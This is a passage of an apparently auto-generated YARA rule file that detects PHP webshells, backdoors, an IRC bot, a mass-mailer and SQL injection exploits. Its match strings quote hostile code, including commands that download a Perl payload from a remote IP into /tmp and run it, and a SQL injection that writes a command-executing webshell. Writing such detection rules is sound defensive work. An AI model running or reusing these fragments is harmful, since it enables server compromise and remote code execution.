      $s9 = "$cmd = $_POST['cmd'];" fullword ascii /* score: '14.00'*/
      $s10 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Script Current User:</b> <?= $user ?></DIV></TD>" fullword ascii /* score: '13.00'*/
      $s11 = "<title>h4ntu shell [powered by tsoi]</title>" fullword ascii /* score: '12.00'*/
      $s12 = "  $user = get_current_user( );" fullword ascii /* score: '12.00'*/
      $s13 = "  if(!$whoami)$whoami=exec(\"whoami\");" fullword ascii /* score: '12.00'*/
      $s14 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Services:</b> <?= \"$SERVER_SOFTWARE $SERVER_VERSION\"; ?>" ascii /* score: '10.00'*/
      $s15 = "  <TD><DIV STYLE=\"font-family: verdana; font-size: 10px;\"><b>Server Services:</b> <?= \"$SERVER_SOFTWARE $SERVER_VERSION\"; ?>" ascii /* score: '10.00'*/
      $s16 = "<font face=\"courier new\" size=\"2\" color=\"777777\">cmd : " fullword ascii /* score: '9.00'*/
      $s17 = "<meta name=\"generator\" content=\"Namo WebEditor v5.0\">" fullword ascii /* score: '9.00'*/
      $s18 = "  $euid = posix_geteuid( );" fullword ascii /* score: '9.00'*/
      $s19 = "  $gid = posix_getgid( );" fullword ascii /* score: '9.00'*/
      $s20 = "  closelog( );" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x743c and filesize < 7KB and
      8 of them
}

rule exploit_php_sqlinjection_ghc_d_a__69bb8646001d {
   meta:
      description = "php__loose__php - file exploit_php_sqlinjection_ghc_d_a__69bb8646001d"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "69bb8646001d0ac341b43a53951bc796aa11058ecb8ed67b81232393e73ed1ab"
   strings:
      $s1 = "| RST/GHC Datalife SQL injection exploit |" fullword ascii /* score: '18.00'*/
      $s2 = "$host   = 'http://' . $argv[1] . '/index.php'; # argv[1] - host" fullword ascii /* score: '18.00'*/
      $s3 = "print \" Usage: \" . $argv[0] . \" <host> <user> [table prefix]\\n\";" fullword ascii /* score: '17.00'*/
      $s4 = "print \"Trying to get hash for password of user \". $argv[2] .\" with id=\" . $user_id . \":\\n\";" fullword ascii /* score: '17.00'*/
      $s5 = " $result = file_get_contents($http);" fullword ascii /* score: '17.00'*/
      $s6 = "$result = file_get_contents($urla);" fullword ascii /* score: '14.00'*/
      $s7 = "$urla = 'http://' . $argv[1] . '/index.php?subaction=userinfo&user=' . $argv[2];" fullword ascii /* score: '13.00'*/
      $s8 = "$query  = '?subaction=userinfo&user=' . $name .'%2527%20and%20ascii(substring((SELECT%20password%20FROM%20' . $prefix. 'users%20" ascii /* score: '12.00'*/
      $s9 = "$http = $host . $query;" fullword ascii /* score: '12.00'*/
      $s10 = "ini_set(\"max_execution_time\",0);" fullword ascii /* score: '12.00'*/
      $s11 = "$query  = '?subaction=userinfo&user=' . $name .'%2527%20and%20ascii(substring((SELECT%20password%20FROM%20' . $prefix. 'users%20" ascii /* score: '12.00'*/
      $s12 = " $compare = intval($fmin + ($fmax-$fmin)/2);" fullword ascii /* score: '11.00'*/
      $s13 = "if (check(\">$min\", 1) == 0 && check(\"<$max\", 1) == 0) {print \"\\n Site is unvulnerable...\"; credits();}" fullword ascii /* score: '11.00'*/
      $s14 = "$str1 = 'user='; #index.php?do=pm&doaction=newpm&user=" fullword ascii /* score: '10.00'*/
      $s15 = "error_reporting (E_ERROR);" fullword ascii /* score: '10.00'*/
      $s16 = "print \"\\n\\r http://rst.void.ru && http://ghc.ru\\n\\r+========================================+\\n\";" fullword ascii /* score: '10.00'*/
      $s17 = " $crcheck = \">\". $compare;" fullword ascii /* score: '7.00'*/
      $s18 = "print \" ex.: \" . $argv[0] . \" datalife.engine.net admin\\n\";" fullword ascii /* score: '7.00'*/
      $s19 = "$user_id = intval(substr($result, $pos1, $pos-$pos1));" fullword ascii /* score: '7.00'*/
      $s20 = "if ($position === false){ print \"\\n\\rSorry, no match found for user \" . $argv[2]; credits();}" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule backdoor_php_news_a__4894834a8132 {
   meta:
      description = "php__loose__php - file backdoor_php_news_a__4894834a8132"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "4894834a813294cfc9a35c370364a404ae0293adeb1c55969beab067dcff36e5"
   strings:
      $s1 = "echo \"After clicking go to http://www.site.com/path2phpshell/shell.php?cpc=ls to see results\";" fullword ascii /* score: '22.00'*/
      $s2 = "<header>||   .::News PHP Shell Injection::.   ||</header> <br /> <br />" fullword ascii /* score: '22.00'*/
      $s3 = "<title>|| .::News Remote PHP Shell Injection::. ||   </title>" fullword ascii /* score: '20.00'*/
      $s4 = "<input type = \"text\" name = \"url\" value = \"http://www.site.com/n13/index.php\"; size = \"50\"> <br />" fullword ascii /* score: '17.00'*/
      $s5 = "<input type = \"text\" name = \"outfile\" value = \"/var/www/localhost/htdocs/n13/shell.php\" size = \"50\"> <br /> <br />" fullword ascii /* score: '16.00'*/
      $s6 = "Full server path to a writable file which will contain the Php Shell <br />" fullword ascii /* score: '12.00'*/
      $s7 = "Server Path to Shell: <br />" fullword ascii /* score: '12.00'*/
      $s8 = "$sql = \"0' UNION SELECT '0' , '<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO OUTFILE '$outfile\";" fullword ascii /* score: '12.00'*/
      $s9 = "$url = $_POST['url'];" fullword ascii /* score: '9.00'*/
      $s10 = "<form action = \"<?php echo \"$_SERVER[PHP_SELF]\" ; ?>\" method = \"post\">" fullword ascii /* score: '9.00'*/
      $s11 = "if (isset($_POST['url'])) {" fullword ascii /* score: '9.00'*/
      $s12 = "$outfile = $_POST ['outfile'];" fullword ascii /* score: '9.00'*/
      $s13 = "$path2news = $_POST['path2news'];" fullword ascii /* score: '9.00'*/
      $s14 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';" fullword ascii /* score: '8.00'*/
      $s15 = "<input type = \"submit\" value = \"Create Exploit\"> <br /> <br />" fullword ascii /* score: '8.00'*/
      $s16 = "Url to index.php: <br /> " fullword ascii /* score: '7.00'*/
      $s17 = "$sql = urlencode($sql);" fullword ascii /* score: '4.00'*/
      $s18 = "$expurl= $url.\"?id=\".$sql ;" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule trojan_mailfinder_php_massma_k__47afb8f12420 {
   meta:
      description = "php__loose__php - file trojan_mailfinder_php_massma_k__47afb8f12420"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "47afb8f12420b1af579e38912e28216a49ec06e77dd3ca3fd343fecadcea232c"
   strings:
      $s1 = "  $db = mysql_connect($sqlhost, $sqllogin, $sqlpass) or die(\"Connection to MySQL Failed.\");  " fullword ascii /* score: '26.00'*/
      $s2 = "  if (!$sqlhost || !$sqllogin || !$sqlpass || !$sqldb || !$sqlquery){  " fullword ascii /* score: '20.00'*/
      $s3 = "  <p align=\"left\"><img src=\"http://www.geocities.com/i5bala/images/linuxpenny.gif\" alt=\"Sir-ToTTi\" width=\"145\" height=\"" ascii /* score: '17.00'*/
      $s4 = "  <p align=\"left\"><img src=\"http://www.geocities.com/i5bala/images/linuxpenny.gif\" alt=\"Sir-ToTTi\" width=\"145\" height=\"" ascii /* score: '17.00'*/
      $s5 = "@$contenttype=$_POST['contenttype'];  " fullword ascii /* score: '14.00'*/
      $s6 = "  $float = \"From : mailist info <full@info.com>\";  " fullword ascii /* score: '14.00'*/
      $s7 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-1\" />  " fullword ascii /* score: '12.00'*/
      $s8 = "<img src=\"http://static.last.fm/groupavatar/f085ea00762fb0faaf15052142de5c0e.png\"  alt=\"Funciona con todos los linux!\" width" ascii /* score: '12.00'*/
      $s9 = "<img src=\"http://static.last.fm/groupavatar/f085ea00762fb0faaf15052142de5c0e.png\"  alt=\"Funciona con todos los linux!\" width" ascii /* score: '12.00'*/
      $s10 = "      Maximum script execution time(in seconds, 0 for no timelimit)<input type=\"text\" name=\"timelimit\" value=\"0\" size=\"10" ascii /* score: '10.00'*/
      $s11 = "@$subject=$_POST['subject'];  " fullword ascii /* score: '9.00'*/
      $s12 = "      If ($file_name) $header .= \"Content-Type: multipart/mixed; boundary=$uid\\r\\n\";  " fullword ascii /* score: '9.00'*/
      $s13 = "      If ($file_name) $header .= \"Content-Disposition: attachment; filename=\\\"$file_name\\\"\\r\\n\\r\\n\";  " fullword ascii /* score: '9.00'*/
      $s14 = "<head>  " fullword ascii /* score: '9.00'*/
      $s15 = "      $header .= \"Content-Type: text/$contenttype\\r\\n\";  " fullword ascii /* score: '9.00'*/
      $s16 = "set_time_limit(intval($_POST['timelimit']));  " fullword ascii /* score: '9.00'*/
      $s17 = "@$emaillist=$_POST['emaillist'];  " fullword ascii /* score: '9.00'*/
      $s18 = "</head>  " fullword ascii /* score: '9.00'*/
      $s19 = "@$amount=$_POST['amount'];  " fullword ascii /* score: '9.00'*/
      $s20 = "      If ($file_name) $header .= \"Content-Transfer-Encoding: base64\\r\\n\";  " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule trojan_downloader_php_anakdompu_a__980d3cd5695b {
   meta:
      description = "php__loose__php - file trojan_downloader_php_anakdompu_a__980d3cd5695b"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "980d3cd5695b325b80fa77f6746cf2a3888bfaedf9a6e7ae155997bd17fe7a31"
   strings:
      $x1 = "@shell_exec('cd /tmp;GET http://203.113.6.34/id/nusatenggara.txt > nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt" ascii /* score: '45.00'*/
      $x2 = "@shell_exec('cd /tmp;GET http://203.113.6.34/id/nusatenggara.txt > nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt" ascii /* score: '45.00'*/
      $x3 = "@shell_exec('cd /tmp;wget http://203.113.6.34/id/nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt*');" fullword ascii /* score: '45.00'*/
      $x4 = "@shell_exec('cd /tmp;lwp-download http://203.113.6.34/id/nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt*');" fullword ascii /* score: '44.00'*/
      $x5 = "@exec('cd /tmp;lwp-download http://203.113.6.34/id/nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt*');" fullword ascii /* score: '44.00'*/
      $x6 = "@exec('cd /tmp;wget http://203.113.6.34/id/nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt*');" fullword ascii /* score: '43.00'*/
      $x7 = "@exec('cd /tmp;GET http://203.113.6.34/id/nusatenggara.txt > nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt*');" fullword ascii /* score: '43.00'*/
      $x8 = "@shell_exec('cd /tmp;fetch http://203.113.6.34/id/nusatenggara.txt > nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.t" ascii /* score: '40.00'*/
      $x9 = "@shell_exec('cd /tmp;lynx -source http://203.113.6.34/id/nusatenggara.txt >nusatenggara.txt;perl nusatenggara.txt;rm -f nusateng" ascii /* score: '40.00'*/
      $x10 = "@shell_exec('cd /tmp;lynx -source http://203.113.6.34/id/nusatenggara.txt >nusatenggara.txt;perl nusatenggara.txt;rm -f nusateng" ascii /* score: '40.00'*/
      $x11 = "@shell_exec('cd /tmp;curl -O http://203.113.6.34/id/nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt*');" fullword ascii /* score: '40.00'*/
      $x12 = "@shell_exec('cd /tmp;fetch http://203.113.6.34/id/nusatenggara.txt > nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.t" ascii /* score: '40.00'*/
      $x13 = "@passthru('cd /tmp;lwp-download http://203.113.6.34/id/nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt*');" fullword ascii /* score: '39.00'*/
      $x14 = "@system('cd /tmp;lwp-download http://203.113.6.34/id/nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt*');" fullword ascii /* score: '39.00'*/
      $x15 = "@passthru('cd /tmp;lwp-downloadhttp://203.113.6.34/id/nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt*');" fullword ascii /* score: '39.00'*/
      $x16 = "@exec('cd /tmp;lynx -source http://203.113.6.34/id/nusatenggara.txt >nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.t" ascii /* score: '38.00'*/
      $x17 = "@system('cd /tmp;wget http://203.113.6.34/id/nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt*');" fullword ascii /* score: '38.00'*/
      $x18 = "@passthru('cd /tmp;GET http://203.113.6.34/id/nusatenggara.txt > nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt*'" ascii /* score: '38.00'*/
      $x19 = "@passthru('cd /tmp;wget http://203.113.6.34/id/nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt*');" fullword ascii /* score: '38.00'*/
      $x20 = "@exec('cd /tmp;curl -O http://203.113.6.34/id/nusatenggara.txt;perl nusatenggara.txt;rm -f nusatenggara.txt*');" fullword ascii /* score: '38.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*)
}

rule backdoor_php_ircbot_ibli__7a4f68f928ab {
   meta:
      description = "php__loose__php - file backdoor_php_ircbot_ibli__7a4f68f928ab"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "7a4f68f928ab42e045acf847b99659b5b7cd3677d9341db1f8a360b38a6de1fe"
   strings:
      $s1 = "$remotehost= $remotehst2[rand(0,count($remotehst2) - 1)];" fullword ascii /* score: '20.00'*/
      $s2 = "  $remotehost = \"irc.dal.net\";" fullword ascii /* score: '20.00'*/
      $s3 = "elseif ($com[3]==':`vhost' && $auth[\"$dNick\"][\"status\"]==\"Admin\") {" fullword ascii /* score: '18.00'*/
      $s4 = "//fighter script - ibli" fullword ascii /* score: '18.00'*/
      $s5 = "ini_set('user_agent','MSIE 5\\.5;');" fullword ascii /* score: '17.00'*/
      $s6 = "  $Header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;" fullword ascii /* score: '16.00'*/
      $s7 = "$remotehst2= array(\"irc.telkom.net.id\");" fullword ascii /* score: '15.00'*/
      $s8 = "fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass33] <Spyderur" ascii /* score: '15.00'*/
      $s9 = "} else { $remotehost = $com[4]; }" fullword ascii /* score: '15.00'*/
      $s10 = "$username = $usr1[rand(0,count($usr1) - 1)].$usr1[rand(0,count($usr1) - 1)].$usr1[rand(0,count($usr1) - 1)];" fullword ascii /* score: '15.00'*/
      $s11 = "} else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again '" ascii /* score: '15.00'*/
      $s12 = "elseif ($auth[\"$dNick\"][\"status\"] && $com[3]==':deluser' && $com[4]) {" fullword ascii /* score: '13.00'*/
      $s13 = "elseif ($com[3]==':`botnick' && $com[4] && !$chan && $auth[\"$dNick\"][\"status\"]==\"Admin\") {" fullword ascii /* score: '13.00'*/
      $s14 = "if (eregi(\"www.\",$iText) || eregi(\"http:\",$iText) || eregi(\"join #\",$iText)) {" fullword ascii /* score: '13.00'*/
      $s15 = "elseif ($com[3]==':`join' && $com[4] && $auth[\"$dNick\"][\"status\"]==\"Admin\") {" fullword ascii /* score: '13.00'*/
      $s16 = "elseif ($com[3]==':`jump' && $auth[\"$dNick\"][\"status\"]==\"Admin\") {" fullword ascii /* score: '13.00'*/
      $s17 = "elseif ($auth[\"$dNick\"][\"status\"] && $com[3]==':auth' && $com[4]) {" fullword ascii /* score: '13.00'*/
      $s18 = "elseif ($com[3]==':`info' && $auth[\"$dNick\"][\"status\"]==\"Admin\") {" fullword ascii /* score: '13.00'*/
      $s19 = "elseif ($auth[\"$dNick\"][\"status\"] && $com[3]==':chgpass' && $com[4] && $com[5]) {" fullword ascii /* score: '13.00'*/
      $s20 = "elseif ($com[3]==':`part' && $auth[\"$dNick\"][\"status\"]==\"Admin\") {" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x2f3c and filesize < 80KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _backdoor_php_nst_f__65876ca1dde6_backdoor_php_nst_e__191d8129e87e_0 {
   meta:
      description = "php__loose__php - from files backdoor_php_nst_f__65876ca1dde6, backdoor_php_nst_e__191d8129e87e"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "65876ca1dde6923447642de1dbcc198b7f5bbe53c26d7eae7f1d675cb5f68774"
      hash2 = "191d8129e87ea59d8a147802d27b4275f649b99eea5f548e5e8301ab443c3002"
   strings:
      $x1 = " [<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tb" ascii /* score: '36.00'*/
      $x2 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii /* score: '34.00'*/
      $s3 = "# example: Delete autoexec.bat (nst) del c:\\autoexec.bat" fullword ascii /* score: '29.00'*/
      $s4 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"0;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii /* score: '28.00'*/
      $s5 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1" ascii /* score: '28.00'*/
      $s6 = "John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>\";" fullword ascii /* score: '27.00'*/
      $s7 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><input type=submit value='Start' name=bc_c style='" ascii /* score: '25.00'*/
      $s8 = "E $str[0] ?\\\")'>[DEL]<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$str[0]&dump_db=$str[0]&f_d=$d'" ascii /* score: '25.00'*/
      $s9 = "if($_GET['dump_download']){" fullword ascii /* score: '25.00'*/
      $s10 = "DUMP]</a></a> <b><a href='$php_self?baza=1&db=$str[0]&p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</" ascii /* score: '25.00'*/
      $s11 = "print \"<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&delete_db=$str[0]' onclick='return confirm(\\\"DE" ascii /* score: '25.00'*/
      $s12 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"2;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii /* score: '23.00'*/
      $s13 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&" ascii /* score: '23.00'*/
      $s14 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1" ascii /* score: '23.00'*/
      $s15 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&" ascii /* score: '23.00'*/
      $s16 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1\\\">\";" ascii /* score: '23.00'*/
      $s17 = "print \"<meta http-equiv=\\\"REFRESH\\\" content=\\\"2;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&" ascii /* score: '23.00'*/
      $s18 = "Display all process - wide output (nst) ps auxw" fullword ascii /* score: '23.00'*/
      $s19 = "# dump table" fullword ascii /* score: '22.00'*/
      $s20 = "# Dump from: \".$_SERVER[\"SERVER_NAME\"].\" (\".$_SERVER[\"SERVER_ADDR\"].\")" fullword ascii /* score: '22.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _backdoor_php_xigor_a__2723d9e670c1_backdoor_php_peterson__292f097492d6_1 {
   meta:
      description = "php__loose__php - from files backdoor_php_xigor_a__2723d9e670c1, backdoor_php_peterson__292f097492d6"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "2723d9e670c12f46218bfd70b532fbd956a3868a7f8ff7aeab2fcb8e3e01b9a4"
      hash2 = "292f097492d6c710d207d22eab3aaa9b89897a84bade1d85dfb9a83aa85282a5"
   strings:
      $s1 = " if (!empty($_POST['cmd'])) { $cmdget = @$_POST['cmd']; }" fullword ascii /* score: '14.00'*/
      $s2 = "elseif (@$_GET['action'] == 'cmd') {" fullword ascii /* score: '14.00'*/
      $s3 = " if (!empty($_GET['cmd'])) { $cmdget = @$_GET['cmd']; }" fullword ascii /* score: '14.00'*/
      $s4 = " $conteudo = @file_get_contents($filename);" fullword ascii /* score: '14.00'*/
      $s5 = " $cmdget = htmlspecialchars($cmdget);" fullword ascii /* score: '12.00'*/
      $s6 = "<meta http-equiv=\"Content-Language\" content=\"pt-br\">" fullword ascii /* score: '12.00'*/
      $s7 = " $cmdget = '';" fullword ascii /* score: '12.00'*/
      $s8 = "if (@$_GET['action'] == 'upload') {" fullword ascii /* score: '11.00'*/
      $s9 = " echo \"var o = prompt('Copied for:', '/tmp/' + file);\";" fullword ascii /* score: '11.00'*/
      $s10 = "        @dl('php_shmop.dll');" fullword ascii /* score: '11.00'*/
      $s11 = " $chdir = str_replace($SCRIPT_NAME, \"\", $_SERVER['SCRIPT_NAME']);" fullword ascii /* score: '10.00'*/
      $s12 = " echo \"</script>\";" fullword ascii /* score: '10.00'*/
      $s13 = " echo \"<script type=\\\"text/javascript\\\">\";" fullword ascii /* score: '10.00'*/
      $s14 = " // End JavaScript" fullword ascii /* score: '10.00'*/
      $s15 = " $fstring = $_SERVER['PHP_SELF'].\"?\".$s1.$mhost;" fullword ascii /* score: '9.00'*/
      $s16 = "elseif (@$_GET['action'] == 'mkdir') {" fullword ascii /* score: '9.00'*/
      $s17 = "if (@$_GET['chdir']) {" fullword ascii /* score: '9.00'*/
      $s18 = " $uploadfile = $uploaddir. $_FILES['userfile']['name'];" fullword ascii /* score: '9.00'*/
      $s19 = "elseif (@$_GET['action'] == 'del') {" fullword ascii /* score: '9.00'*/
      $s20 = " $host_all = explode(\"$mhost\", $string);" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x683c and filesize < 60KB and ( 8 of them )
      ) or ( all of them )
}

rule _backdoor_php_xkn_a__cdadd3591bd1_backdoor_php_bypass_a__0be0f7808648_2 {
   meta:
      description = "php__loose__php - from files backdoor_php_xkn_a__cdadd3591bd1, backdoor_php_bypass_a__0be0f7808648"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "cdadd3591bd11387f78dd14160db7775878141d58efe232d34590da1d1c6f0e1"
      hash2 = "0be0f7808648726c33b90635689cf4552955836c2ea36c8d35d845e31873cff4"
   strings:
      $s1 = "<!-- <?php echo $scriptident ?>, <?php echo $scriptver ?>, <?php echo $scriptdate ?>  -->" fullword ascii /* score: '23.00'*/
      $s2 = "    if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset($PHP_AUTH_USER) || $PHP_AUTH_USER != $http_auth_" ascii /* score: '13.00'*/
      $s3 = "user || $PHP_AUTH_PW != $http_auth_pass)  ||  (($logoff==1) && $noauth==\"yes\")  )   { " fullword ascii /* score: '13.00'*/
      $s4 = "  <!--    </form>   -->" fullword ascii /* score: '12.00'*/
      $s5 = "if (isset($_GET)) walkArray($_GET);" fullword ascii /* score: '9.00'*/
      $s6 = "      <form name=\"urlform\" action=\"<?php echo \"$SFileName?$urlAdd\"; ?>\" method=\"POST\"><input type=\"hidden\" name=\"cmd" ascii /* score: '9.00'*/
      $s7 = "if (isset($_POST)) walkArray($_POST);" fullword ascii /* score: '9.00'*/
      $s8 = "else if ( $cmd == \"con\") {" fullword ascii /* score: '9.00'*/
      $s9 = "***************************************************************************************** " fullword ascii /* score: '9.00'*/
      $s10 = "      <form name=\"urlform\" action=\"<?php echo \"$SFileName?$urlAdd\"; ?>\" method=\"POST\"><input type=\"hidden\" name=\"cmd" ascii /* score: '9.00'*/
      $s11 = "if ($cmd != \"downl\") {" fullword ascii /* score: '9.00'*/
      $s12 = "    if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset($PHP_AUTH_USER) || $PHP_AUTH_USER != $http_auth_" ascii /* score: '8.00'*/
      $s13 = "     while (list ($key, $file) = each ($Dcontents)) {" fullword ascii /* score: '7.00'*/
      $s14 = "list($key, $data) = $array;" fullword ascii /* score: '7.00'*/
      $s15 = "  while (list($key, $data) = each($array))" fullword ascii /* score: '7.00'*/
      $s16 = "$REMOTE_IMAGE_URL = \"img\";" fullword ascii /* score: '7.00'*/
      $s17 = "$PHPVer=phpversion();" fullword ascii /* score: '7.00'*/
      $s18 = " <HEAD>" fullword ascii /* score: '6.00'*/
      $s19 = "if ( $cmd==\"dir\" ) {" fullword ascii /* score: '6.00'*/
      $s20 = "function formatsize($insize) {  " fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _backdoor_php_ayyildiztim__12b46dabe382_backdoor_php_matamumat_a__91a8a7a68a96_3 {
   meta:
      description = "php__loose__php - from files backdoor_php_ayyildiztim__12b46dabe382, backdoor_php_matamumat_a__91a8a7a68a96"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "12b46dabe382f7a8ea7f54eacf1412c7c3e7ba864e0000ee936dac29681ef307"
      hash2 = "91a8a7a68a966b89feeabc887a84f5302daf379cc6feef3a58b20122f43004ef"
   strings:
      $s1 = "  system($command);" fullword ascii /* score: '15.00'*/
      $s2 = "  if (!empty($HTTP_GET_VARS))" fullword ascii /* score: '12.00'*/
      $s3 = "  if (!empty($HTTP_POST_VARS))" fullword ascii /* score: '12.00'*/
      $s4 = "$work_dir = exec('pwd');" fullword ascii /* score: '12.00'*/
      $s5 = "  } else if ($command == 'ls') {" fullword ascii /* score: '12.00'*/
      $s6 = "  if (!empty($command)) {" fullword ascii /* score: '12.00'*/
      $s7 = "      /* We try and match a cd command. */" fullword ascii /* score: '11.00'*/
      $s8 = "/* work_dir is only 1 charecter - it can only be / There's no" fullword ascii /* score: '8.00'*/
      $s9 = "  /* We'll register the variables as globals: */" fullword ascii /* score: '8.00'*/
      $s10 = "  /* A workdir has been asked for */" fullword ascii /* score: '8.00'*/
      $s11 = "  /* We change directory to that dir: */" fullword ascii /* score: '8.00'*/
      $s12 = "echo '<a href=\"' . $PHP_SELF . '?work_dir=/\">Root</a>/';" fullword ascii /* score: '7.00'*/
      $s13 = "    extract($HTTP_POST_VARS);" fullword ascii /* score: '7.00'*/
      $s14 = "    /* ls looks much better with ' -F', IMHO. */" fullword ascii /* score: '7.00'*/
      $s15 = "  if (!empty($HTTP_SERVER_VARS))" fullword ascii /* score: '7.00'*/
      $s16 = "    extract($HTTP_GET_VARS);" fullword ascii /* score: '7.00'*/
      $s17 = "    $command .= \" 1> $tmpfile 2>&1; \" ." fullword ascii /* score: '7.00'*/
      $s18 = " directory... Trust me - it works :-) */" fullword ascii /* score: '7.00'*/
      $s19 = "      unset($command);" fullword ascii /* score: '7.00'*/
      $s20 = " directory is the root directory (/). */" fullword ascii /* score: '7.00'*/
   condition:
      ( ( uint16(0) == 0x683c or uint16(0) == 0x3f3c ) and filesize < 30KB and ( 8 of them )
      ) or ( all of them )
}

rule _backdoor_php_loaders_a_b__63a7b9625ecd_backdoor_php_nshell_c__a4f5649bb835_4 {
   meta:
      description = "php__loose__php - from files backdoor_php_loaders_a_b__63a7b9625ecd, backdoor_php_nshell_c__a4f5649bb835"
      author = "Comps Team Malware Lab"
      reference = "php__loose__php php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "63a7b9625ecdfe253befe8a061a8d3d9e1475eb8f36d54f67dfc63bb410f0277"
      hash2 = "a4f5649bb8356f0d78830c3e3ac032624dda4da5b5288190975aaa9c0cb4992f"
   strings:
      $s1 = "$group[\"execute\"] = ($mode & 00010) ? 'x' : '-';" fullword ascii /* score: '14.00'*/
      $s2 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-';" fullword ascii /* score: '14.00'*/
      $s3 = "if( $mode & 0x200 ) $world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T';" fullword ascii /* score: '14.00'*/
      $s4 = "$owner[\"execute\"] = ($mode & 00100) ? 'x' : '-';" fullword ascii /* score: '14.00'*/
      $s5 = "if( $mode & 0x400 ) $group[\"execute\"] = ($group['execute']=='x') ? 's' : 'S';" fullword ascii /* score: '14.00'*/
      $s6 = "$s.=sprintf(\"%1s%1s%1s\", $group['read'], $group['write'], $group['execute']);" fullword ascii /* score: '14.00'*/
